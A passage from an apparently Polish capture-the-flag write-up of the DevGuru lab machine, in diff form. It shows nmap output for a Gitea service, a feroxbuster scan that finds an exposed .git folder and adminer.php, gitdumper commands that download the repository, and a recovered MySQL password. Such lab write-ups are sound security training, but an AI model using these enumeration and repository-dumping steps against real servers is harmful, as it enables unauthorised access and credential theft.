+|   GetRequest:                        
+|     HTTP/1.0 <span style="color:#ae81ff">200</span> OK
+|     Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+|     Set-Cookie: lang<span style="color:#f92672">=</span>en-US; Path<span style="color:#f92672">=</span>/; Max-Age<span style="color:#f92672">=</span><span style="color:#ae81ff">2147483647</span>
+|     Set-Cookie: i_like_gitea<span style="color:#f92672">=</span>32f5ac169d8deb82; Path<span style="color:#f92672">=</span>/; HttpOnly
+|     Set-Cookie: _csrf<span style="color:#f92672">=</span>wBgH_u02QnP4yJ8KIFYSVFpFKnE6MTY1OTgyMDA0MTQ4OTkxMzkwMw; Path<span style="color:#f92672">=</span>/; Expires<span style="color:#f92672">=</span>Sun, <span style="color:#ae81ff">07</span> Aug <span style="color:#ae81ff">2022</span> 21:07:21 GMT; HttpOnly
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Sat, <span style="color:#ae81ff">06</span> Aug <span style="color:#ae81ff">2022</span> 21:07:21 GMT
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en-US&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;theme-&#34;</span>&gt;
+|     &lt;head data-suburl<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;
+|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
+|     &lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;x-ua-compatible&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ie=edge&#34;</span>&gt;
+|     &lt;title&gt; Gitea: Git with a cup of tea &lt;/title&gt;
+|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;manifest&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/manifest.json&#34;</span> crossorigin<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;use-credentials&#34;</span>&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;theme-color&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#6cc644&#34;</span>&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;author&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Gitea - Git with a cup of tea&#34;</span> /&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;description&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Gitea (Git with a cup of tea) is a painless
+</span><span style="color:#e6db74">|   HTTPOptions:                       
+</span><span style="color:#e6db74">|     HTTP/1.0 404 Not Found
+</span><span style="color:#e6db74">|     Content-Type: text/html; charset=UTF-8
+</span><span style="color:#e6db74">|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
+</span><span style="color:#e6db74">|     Set-Cookie: i_like_gitea=16044c52ab089b30; Path=/; HttpOnly
+</span><span style="color:#e6db74">|     Set-Cookie: _csrf=yMdfk0ejwyAi7ZAapQa4bI5m9tw6MTY1OTgyMDA0MTUwNjQ1Nzk1OA; Path=/; Expires=Sun, 07 Aug 2022 21:07:21 GMT; HttpOnly
+</span><span style="color:#e6db74">|     X-Frame-Options: SAMEORIGIN
+</span><span style="color:#e6db74">|     Date: Sat, 06 Aug 2022 21:07:21 GMT
+</span><span style="color:#e6db74">|     &lt;!DOCTYPE html&gt;
+</span><span style="color:#e6db74">|     &lt;html lang=&#34;</span>en-US<span style="color:#e6db74">&#34; class=&#34;</span>theme-<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;head data-suburl=&#34;&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;meta charset=&#34;</span>utf-8<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;meta name=&#34;</span>viewport<span style="color:#e6db74">&#34; content=&#34;</span>width<span style="color:#f92672">=</span>device-width, initial-scale<span style="color:#f92672">=</span>1<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;meta http-equiv=&#34;</span>x-ua-compatible<span style="color:#e6db74">&#34; content=&#34;</span>ie<span style="color:#f92672">=</span>edge<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;title&gt;Page Not Found - Gitea: Git with a cup of tea &lt;/title&gt;
+</span><span style="color:#e6db74">|     &lt;link rel=&#34;</span>manifest<span style="color:#e6db74">&#34; href=&#34;</span>/manifest.json<span style="color:#e6db74">&#34; crossorigin=&#34;</span>use-credentials<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;meta name=&#34;</span>theme-color<span style="color:#e6db74">&#34; content=&#34;</span><span style="color:#75715e">#6cc644&#34;&gt;</span>
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;author&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Gitea - Git with a cup of tea&#34;</span> /&gt;
+|_    &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;description&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Gitea (Git with a c
+</span><span style="color:#e6db74">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi
+</span><span style="color:#e6db74">?new-service :                         
+</span><span style="color:#e6db74">SF-Port8585-TCP:V=7.92%I=7%D=8/6%Time=62EED80A%P=x86_64-pc-linux-gnu%r(Gen
+</span><span style="color:#e6db74">SF:ericLines,67,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20te
+SF:xt/plain;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+SF:0Request<span style="color:#e6db74">&#34;)%r(GetRequest,2A00,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20200<span style="color:#ae81ff">\x</span>20OK<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>
+SF:20text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>UTF-8<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span>en-US;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:x20Max-Age<span style="color:#f92672">=</span>2147483647<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20i_like_gitea<span style="color:#f92672">=</span>32f5ac169d8deb82;<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:x20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20HttpOnly<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20_csrf<span style="color:#f92672">=</span>wBgH_u02QnP4yJ8KIFYSVFpF
+SF:KnE6MTY1OTgyMDA0MTQ4OTkxMzkwMw;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20Expires<span style="color:#f92672">=</span>Sun,<span style="color:#ae81ff">\x</span>2007<span style="color:#ae81ff">\x</span>20Aug
+SF:<span style="color:#ae81ff">\x</span>202022<span style="color:#ae81ff">\x</span>2021:07:21<span style="color:#ae81ff">\x</span>20GMT;<span style="color:#ae81ff">\x</span>20HttpOnly<span style="color:#ae81ff">\r\n</span>X-Frame-Options:<span style="color:#ae81ff">\x</span>20SAMEORI
+SF:GIN<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Sat,<span style="color:#ae81ff">\x</span>2006<span style="color:#ae81ff">\x</span>20Aug<span style="color:#ae81ff">\x</span>202022<span style="color:#ae81ff">\x</span>2021:07:21<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n\r\n</span>&lt;!D
+SF:OCTYPE<span style="color:#ae81ff">\x</span>20html&gt;<span style="color:#ae81ff">\n</span>&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en-US<span style="color:#ae81ff">\&#34;\x</span>20class<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>theme-<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n</span>&lt;head<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+SF:0data-suburl<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>utf-8<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>vi
+SF:ewport<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>width<span style="color:#f92672">=</span>device-width,<span style="color:#ae81ff">\x</span>20initial-scale<span style="color:#f92672">=</span>1<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;met
+SF:a<span style="color:#ae81ff">\x</span>20http-equiv<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>x-ua-compatible<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>ie<span style="color:#f92672">=</span>edge<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;title&gt;<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:x20Gitea:<span style="color:#ae81ff">\x</span>20Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20cup<span style="color:#ae81ff">\x</span>20of<span style="color:#ae81ff">\x</span>20tea<span style="color:#ae81ff">\x</span>20&lt;/title&gt;<span style="color:#ae81ff">\n\t</span>&lt;link<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:x20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>manifest<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/manifest<span style="color:#ae81ff">\.</span>json<span style="color:#ae81ff">\&#34;\x</span>20crossorigin<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>use-cr
+SF:edentials<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>theme-color<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#75715e">#6cc644\&#34;&gt;\n</span>
+SF:<span style="color:#ae81ff">\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>author<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Gitea<span style="color:#ae81ff">\x</span>20-<span style="color:#ae81ff">\x</span>20Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:x20cup<span style="color:#ae81ff">\x</span>20of<span style="color:#ae81ff">\x</span>20tea<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>description<span style="color:#ae81ff">\&#34;\x</span>20content
+SF:<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Gitea<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\(</span>Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20cup<span style="color:#ae81ff">\x</span>20of<span style="color:#ae81ff">\x</span>20tea<span style="color:#ae81ff">\)\x</span>20is<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20pain
+SF:less<span style="color:#e6db74">&#34;)%r(HTTPOptions,212A,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20404<span style="color:#ae81ff">\x</span>20Not<span style="color:#ae81ff">\x</span>20Found<span style="color:#ae81ff">\r\n</span>Content-
+SF:Type:<span style="color:#ae81ff">\x</span>20text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>UTF-8<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span>en-US;<span style="color:#ae81ff">\x</span>20P
+SF:ath<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20Max-Age<span style="color:#f92672">=</span>2147483647<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20i_like_gitea<span style="color:#f92672">=</span>16044c52ab0
+SF:89b30;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20HttpOnly<span style="color:#ae81ff">\r\n</span>Set-Cookie:<span style="color:#ae81ff">\x</span>20_csrf<span style="color:#f92672">=</span>yMdfk0ejwyAi7ZAap
+SF:Qa4bI5m9tw6MTY1OTgyMDA0MTUwNjQ1Nzk1OA;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20Expires<span style="color:#f92672">=</span>Sun,<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2007</span>
+SF:<span style="color:#ae81ff">\x</span>20Aug<span style="color:#ae81ff">\x</span>202022<span style="color:#ae81ff">\x</span>2021:07:21<span style="color:#ae81ff">\x</span>20GMT;<span style="color:#ae81ff">\x</span>20HttpOnly<span style="color:#ae81ff">\r\n</span>X-Frame-Options:<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+SF:SAMEORIGIN<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Sat,<span style="color:#ae81ff">\x</span>2006<span style="color:#ae81ff">\x</span>20Aug<span style="color:#ae81ff">\x</span>202022<span style="color:#ae81ff">\x</span>2021:07:21<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>
+SF:<span style="color:#ae81ff">\r\n</span>&lt;!DOCTYPE<span style="color:#ae81ff">\x</span>20html&gt;<span style="color:#ae81ff">\n</span>&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en-US<span style="color:#ae81ff">\&#34;\x</span>20class<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>theme-<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n</span>&lt;
+SF:head<span style="color:#ae81ff">\x</span>20data-suburl<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>utf-8<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20na
+SF:me<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>viewport<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>width<span style="color:#f92672">=</span>device-width,<span style="color:#ae81ff">\x</span>20initial-scale<span style="color:#f92672">=</span>1<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:n<span style="color:#ae81ff">\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20http-equiv<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>x-ua-compatible<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>ie<span style="color:#f92672">=</span>edge<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;
+SF:title&gt;Page<span style="color:#ae81ff">\x</span>20Not<span style="color:#ae81ff">\x</span>20Found<span style="color:#ae81ff">\x</span>20-<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20Gitea:<span style="color:#ae81ff">\x</span>20Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20cu
+SF:p<span style="color:#ae81ff">\x</span>20of<span style="color:#ae81ff">\x</span>20tea<span style="color:#ae81ff">\x</span>20&lt;/title&gt;<span style="color:#ae81ff">\n\t</span>&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>manifest<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/mani
+SF:fest<span style="color:#ae81ff">\.</span>json<span style="color:#ae81ff">\&#34;\x</span>20crossorigin<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>use-credentials<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>the
+SF:me-color<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#75715e">#6cc644\&#34;&gt;\n\t&lt;meta\x20name=\&#34;author\&#34;\x20conte</span>
+SF:nt<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Gitea<span style="color:#ae81ff">\x</span>20-<span style="color:#ae81ff">\x</span>20Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20cup<span style="color:#ae81ff">\x</span>20of<span style="color:#ae81ff">\x</span>20tea<span style="color:#ae81ff">\&#34;\x</span>20/&gt;<span style="color:#ae81ff">\n\t</span>&lt;met
+SF:a<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>description<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Gitea<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\(</span>Git<span style="color:#ae81ff">\x</span>20with<span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20c
+SF:<span style="color:#e6db74">&#34;);
+</span><span style="color:#e6db74">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></code></pre></div><hr>
+<h2 id="strona-główna">Strona główna<a hidden class="anchor" aria-hidden="true" href="#strona-główna">#</a></h2>
+<p>Pierwsze co widać to domena <code>devguru.local</code>, zatem dodaję ją do <code>/etc/hosts</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220806233524.png" alt=""  />
+</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220806233744.png" alt=""  />
+</p>
+<p>Z Wappalyzera widzimy, że jest tutaj <code>October CMS</code>, <code>Lavarel</code> oraz <code>PHP</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220806234531.png" alt=""  />
+</p>
+<hr>
+<h2 id="feroxbuster">FeroxBuster<a hidden class="anchor" aria-hidden="true" href="#feroxbuster">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/vulnhub/devguru<span style="color:#f92672">]</span>                                                                                                                          
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$feroxbuster -w /opt/SecLists/Discovery/Web-Content/quickhits.txt -u http://192.168.2.145 -d <span style="color:#ae81ff">1</span> -r                                                       
+                                                                                                                                                              
+ ___  ___  __   __     __      __         __   ___                                                                                                            
+|__  |__  |__<span style="color:#f92672">)</span> |__<span style="color:#f92672">)</span> | /  <span style="color:#e6db74">`</span>    /  <span style="color:#ae81ff">\ \_</span>/ | |  <span style="color:#ae81ff">\ </span>|__                                                                                                             
+|    |___ |  <span style="color:#ae81ff">\ </span>|  <span style="color:#ae81ff">\ </span>| <span style="color:#ae81ff">\_</span>_,    <span style="color:#ae81ff">\_</span>_/ / <span style="color:#ae81ff">\ </span>| |__/ |___                                                                                                            
+by Ben <span style="color:#e6db74">&#34;epi&#34;</span> Risher 🤓                 ver: 2.3.3                                                                                                             
+───────────────────────────┬──────────────────────                                                                                                            
+ 🎯  Target Url            │ http://192.168.2.145                                                                                                             
+ 🚀  Threads               │ <span style="color:#ae81ff">50</span>                                                                                                                               
+ 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/quickhits.txt                                                                                
+ 👌  Status Codes          │ <span style="color:#f92672">[</span>200, 204, 301, 302, 307, 308, 401, 403, 405, 500<span style="color:#f92672">]</span>                                                                               
+ 💥  Timeout <span style="color:#f92672">(</span>secs<span style="color:#f92672">)</span>        │ <span style="color:#ae81ff">7</span>                                                                                                                                
+ 🦡  User-Agent            │ feroxbuster/2.3.3                                                                                                                
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                               
+ 📍  Follow Redirects      │ true                                                                                                                             
+ 🔃  Recursion Depth       │ <span style="color:#ae81ff">1</span>                                                                                                                                
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest                                                                            
+───────────────────────────┴──────────────────────                                                                                                            
+ 🏁  Press <span style="color:#f92672">[</span>ENTER<span style="color:#f92672">]</span> to use the Scan Cancel Menu™                                                                                                               
+──────────────────────────────────────────────────                                                                                                            
+<span style="color:#ae81ff">200</span>        1l        2w       23c http://192.168.2.145/.git/HEAD                                                                                              
+<span style="color:#ae81ff">200</span>       11l       29w      276c http://192.168.2.145/.git/config                                                                                            
+<span style="color:#ae81ff">200</span>      977l     3275w   315757c http://192.168.2.145/.git/index                                                                                             
+<span style="color:#ae81ff">200</span>        1l       10w      158c http://192.168.2.145/.git/logs/HEAD                                                                                         
+<span style="color:#ae81ff">200</span>       32l       38w      413c http://192.168.2.145/.gitignore                                                                                             
+<span style="color:#ae81ff">200</span>       52l      146w     1678c http://192.168.2.145/.htaccess                                                                                              
+<span style="color:#ae81ff">200</span>       50l      231w     4296c http://192.168.2.145/adminer.php                                                                                            
+<span style="color:#ae81ff">200</span>       34l      216w     1518c http://192.168.2.145/README.md                                                                                              
+<span style="color:#ae81ff">200</span>      267l      788w        0c http://192.168.2.145/services                                                                                               
+<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 15s     2482/2482    0s      found:9       errors:0                                                                                  </span>
+<span style="color:#f92672">[</span><span style="color:#75715e">####################] - 14s     2482/2482    170/s   http://192.168.2.145</span>
+</code></pre></div><p>Mamy kilka trafów. Czyli <code>.git</code>, <code>adminer.php</code>, ale sprawdzę całość większym słownikiem.</p>
+<hr>
+<h2 id="adminerphp"><code>/adminer.php</code><a hidden class="anchor" aria-hidden="true" href="#adminerphp">#</a></h2>
+<p>Jest <code>Adminer 4.7.7</code>, na którego nie ma exploitów na searchsploit.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220807030755.png" alt=""  />
+</p>
+<hr>
+<p>Pod <code>/backend/backend/auth/signin/</code> mamy panel logowania.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220806235414.png" alt=""  />
+</p>
+<p>FeroxBuster złapał folder <code>.git</code> a w nim plik <code>config</code>. Mamy potencjalnego usera <code>frank</code> oraz link do repo <code>http://devguru.local:8585/frank/devguru-website.git</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220807001551.png" alt=""  />
+</p>
+<hr>
+<h2 id="port-8585">Port 8585<a hidden class="anchor" aria-hidden="true" href="#port-8585">#</a></h2>
+<p>Mamy tutaj <code>Gitea</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220807001105.png" alt=""  />
+</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220807001238.png" alt=""  />
+
+Jest exploit, ale potrzebujemy danych do logowania. Jest szansa, że przyda nam się to później.</p>
+<hr>
+<h2 id="enumeracja-git">Enumeracja .git<a hidden class="anchor" aria-hidden="true" href="#enumeracja-git">#</a></h2>
+<p>Sprawdzenie folderu .git zawsze warto przeprowadzić <code>GitTools</code>. Mamy tu <code>gitdumper</code> oraz <code>extractor</code>. Na początku użyłem dumpera, którym pobrałem folder <code>.git</code> znaleziony przez <code>FeroxBustera</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo /opt/GitTools/Dumper/gitdumper.sh http://192.168.2.145/.git/ .
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo /opt/GitTools/Extractor/extractor.sh . /.git_extracted
+</code></pre></div><p>Mamy między innymi <code>adminer.php</code> wykryty przez <code>FeroxBustera</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220808025624.png" alt=""  />
+</p>
+<p>Wyszukanie po frazy <code>frank</code> nic ciekawego nie znalazło.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220808025730.png" alt=""  />
+
+Inaczej w przypadku frazy <code>password</code> 😁</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220808025819.png" alt=""  />
+</p>
+<p>Plik <code>database.php</code> zawiera to hasło, dlatego przejrzałem całość.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">        <span style="color:#e6db74">&#39;mysql&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">[</span>                                                                                                                                                                          
+            <span style="color:#e6db74">&#39;driver&#39;</span>     <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;mysql&#39;</span>,  
+            <span style="color:#e6db74">&#39;engine&#39;</span>     <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;InnoDB&#39;</span>,                                          
+            <span style="color:#e6db74">&#39;host&#39;</span>       <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;localhost&#39;</span>,                                                       
+            <span style="color:#e6db74">&#39;port&#39;</span>       <span style="color:#f92672">=</span>&gt; 3306,                                                              
+            <span style="color:#e6db74">&#39;database&#39;</span>   <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;octoberdb&#39;</span>,                                                       
+            <span style="color:#e6db74">&#39;username&#39;</span>   <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;october&#39;</span>,         
+            <span style="color:#e6db74">&#39;password&#39;</span>   <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;SQ66EBYx4GT3byXH&#39;</span>,                                
+            <span style="color:#e6db74">&#39;charset&#39;</span>    <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;utf8mb4&#39;</span>,
+            <span style="color:#e6db74">&#39;collation&#39;</span>  <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;utf8mb4_unicode_ci&#39;</span>,                                              
+            <span style="color:#e6db74">&#39;prefix&#39;</span>     <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;&#39;</span>,      
+            <span style="color:#e6db74">&#39;varcharmax&#39;</span> <span style="color:#f92672">=</span>&gt; 191,     
+        <span style="color:#f92672">]</span>,                       
+                                       
+        <span style="color:#e6db74">&#39;pgsql&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">[</span>               
+            <span style="color:#e6db74">&#39;driver&#39;</span>   <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;pgsql&#39;</span>, 
+            <span style="color:#e6db74">&#39;host&#39;</span>     <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;localhost&#39;</span>, 
+            <span style="color:#e6db74">&#39;port&#39;</span>     <span style="color:#f92672">=</span>&gt; 5432,        
+            <span style="color:#e6db74">&#39;database&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;database&#39;</span>,
